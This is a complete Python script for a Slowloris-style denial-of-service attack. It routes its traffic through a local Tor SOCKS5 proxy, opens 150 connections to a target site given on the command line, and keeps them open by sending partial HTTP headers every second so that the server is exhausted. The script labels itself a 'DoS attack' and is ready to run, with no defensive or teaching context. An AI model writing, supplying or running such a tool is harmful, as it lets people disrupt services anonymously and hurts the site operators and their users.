import socket, socks, random, time, sys

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)

headers = [ 
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0", 
    "Accept-language: en-US,en"
]

sockets = []

def setupSocket(ip):
    sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((ip, 80))
    sock.send("GET /?{} HTTP/2\r\n".format(random.randint(0, 1500)).encode("utf-8"))

    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: python3 {} example.com".format(sys.argv[0]))
        sys.exit()

    ip = sys.argv[1]
    count = 150
    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
    print("wait until reach socket {}".format(count))

    for i in range(count):
        try:
            print("Socket " + str(i))
            sock = setupSocket(ip)
        except socket.error:
            print("error! socket doesn't connect")
            break

        sockets.append(sock)

    send = 0

    while True:
        print("Connected to {} sockets. Sending headers...".format(send))
        send += 1

        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)
                
        time.sleep(1)